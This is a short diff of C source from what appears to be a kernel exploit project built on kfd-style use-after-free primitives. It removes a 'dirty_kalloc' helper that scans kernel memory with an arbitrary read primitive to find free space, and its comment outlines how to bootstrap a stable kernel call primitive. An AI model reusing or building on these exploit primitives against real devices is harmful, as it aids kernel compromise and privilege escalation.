@@ -204,7 +204,7 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     info_run(kfd);
     perf_run(kfd);
     puaf_cleanup(kfd);
-
+    //printf("you get here");
     //timer_end();
     return (u64)(kfd);
 }
@@ -278,36 +278,6 @@ uint64_t find_port(u64 kfd, mach_port_name_t port){
 }
 
 
-
-// FIXME: Currently just finds a zerobuf in memory, this can be overwritten at ANY time, and thus is really unstable and unreliable. Once you get the unstable kcall, use that to bootstrap a stable kcall primitive, not using dirty_kalloc.
-uint64_t dirty_kalloc(u64 kfd, size_t size) {
-    struct kfd* kfd_struct = (struct kfd*)kfd;
-    uint64_t begin = kfd_struct->info.kernel.kernel_proc;
-    uint64_t end = begin + 0x40000000;
-    uint64_t addr = begin;
-    while (addr < end) {
-        bool found = false;
-        for (int i = 0; i < size; i+=4) {
-            uint32_t val = rk32(kfd, addr+i);
-            found = true;
-            if (val != 0) {
-                found = false;
-                addr += i;
-                break;
-            }
-        }
-        if (found) {
-           // util_printf("[+] dirty_kalloc: 0x%llx\n", addr);
-            return addr;
-        }
-        addr += 0x1000;
-    }
-    if (addr >= end) {
-        util_printf("[-] failed to find free space in kernel\n");
-        exit(EXIT_FAILURE);
-    }
-    return 0;
-}
 
 uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
     for(int i = 0; i < size; i+=8) {
